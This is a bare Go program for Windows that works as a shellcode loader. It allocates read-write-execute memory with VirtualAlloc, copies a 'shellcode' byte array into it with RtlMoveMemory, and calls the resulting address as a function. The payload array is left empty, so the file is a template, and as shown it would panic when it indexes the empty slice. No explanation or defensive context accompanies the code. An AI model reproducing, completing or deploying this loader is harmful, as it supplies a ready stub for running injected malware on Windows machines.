package main

import (
	"syscall"
	"unsafe"
)

var (
	kernel32      = syscall.NewLazyDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
)

func main() {
	shellcode := []byte{}

	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40)

	RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	syscall.Syscall(addr, 0, 0, 0, 0)

}
